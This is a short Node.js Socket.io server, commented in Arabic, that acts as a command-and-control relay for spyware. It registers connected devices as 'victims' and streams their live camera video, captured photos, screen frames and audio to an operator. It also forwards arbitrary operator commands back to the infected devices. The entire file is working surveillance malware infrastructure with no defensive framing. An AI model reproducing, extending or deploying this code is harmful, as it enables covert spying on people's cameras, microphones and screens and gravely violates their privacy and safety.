const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

io.on('connection', (socket) => {
    console.log('متصفح متصل:', socket.id);

    socket.on('victim_online', (data) => {
        console.log('ضحية جديدة:', data.model);
        socket.broadcast.emit('new_victim_alert', { id: socket.id, model: data.model });
    });

    // بث الفيديو المباشر من الكاميرا
    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // تمرير الصور عالية الدقة
    socket.on('photo_captured', (img) => {
        socket.broadcast.emit('display_photo', { img: img });
    });

    // بث الشاشة (screen capture)
    socket.on('screen_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // تمرير الصوت المشفر (Base64)
    socket.on('audio_chunk', (chunk) => {
        socket.broadcast.emit('play_audio', { audio: chunk });
    });

    // أوامر التحكم
    socket.on('admin_command', (data) => {
        console.log('أمر:', data.command);
        socket.broadcast.emit(data.command, data);
    });
});

http.listen(process.env.PORT || 8080, '0.0.0.0', () => {
    console.log('🚀 السيرفر شغال على بورت', process.env.PORT || 8080);
});
